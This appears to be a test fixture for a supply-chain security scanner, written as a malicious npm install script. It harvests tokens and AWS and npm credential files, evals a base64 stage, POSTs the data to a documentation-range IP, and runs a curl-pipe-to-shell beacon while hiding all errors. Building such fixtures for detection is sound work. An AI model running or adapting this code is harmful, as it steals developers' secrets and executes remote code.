/*
 * ============================ SYNTHETIC FIXTURE ============================
 * This file is INERT TEST DATA for Sentinel's audit engine. It is never
 * executed by the test suite — the proxy/CLI only read it as text and score it.
 * The exfiltration endpoint is 198.51.100.23, an address from the RFC 5737
 * TEST-NET-2 range reserved for documentation, so it routes nowhere.
 * It reproduces the *patterns* of real attacks (event-stream, ua-parser-js)
 * so we can prove the scanner catches them. Do not "fix" or run it.
 * ==========================================================================
 */
"use strict";

const https = require("https");
const fs = require("fs");
const os = require("os");
const { execSync } = require("child_process");

// 1) Harvest secrets from the environment and well-known credential files.
function harvest() {
  const loot = {};
  for (const key of Object.keys(process.env)) {
    if (/SECRET|TOKEN|KEY|PASS|CREDENTIAL/i.test(key)) {
      loot[key] = process.env[key];
    }
  }
  loot.AWS_SECRET_ACCESS_KEY = process.env.AWS_SECRET_ACCESS_KEY;
  loot.NPM_TOKEN = process.env.NPM_TOKEN;
  try {
    loot.npmrc = fs.readFileSync(os.homedir() + "/.npmrc", "utf8");
    loot.aws = fs.readFileSync(os.homedir() + "/.aws/credentials", "utf8");
  } catch (_) {}
  return loot;
}

// 2) Obfuscated, base64-packed staging payload decoded and evaluated at runtime.
var _0x = "dmFyIHBpbmcgPSAnY29sbGVjdGVkJzsgcGluZyArICcgJyArIERhdGUubm93KCk7IC8vIHN0YWdlIHR3byBkcm9wcGVyIHBsYWNlaG9sZGVy";
var stage = Buffer.from(_0x, "base64").toString("utf8");
eval(stage);

// 3) Exfiltrate to a hardcoded IP over HTTPS.
function exfil(data) {
  const body = Buffer.from(JSON.stringify(data)).toString("base64");
  const req = https.request({
    hostname: "198.51.100.23",
    port: 443,
    path: "/collect",
    method: "POST",
    headers: { "content-type": "application/octet-stream" },
  });
  req.write(body);
  req.end();
}

// 4) Persist via a backgrounded shell, then exit quietly so the install "succeeds".
try {
  exfil(harvest());
  execSync("curl -s https://198.51.100.23/beacon | sh >/dev/null 2>&1 &");
} catch (_) {
  // swallow everything so npm install shows no error
}
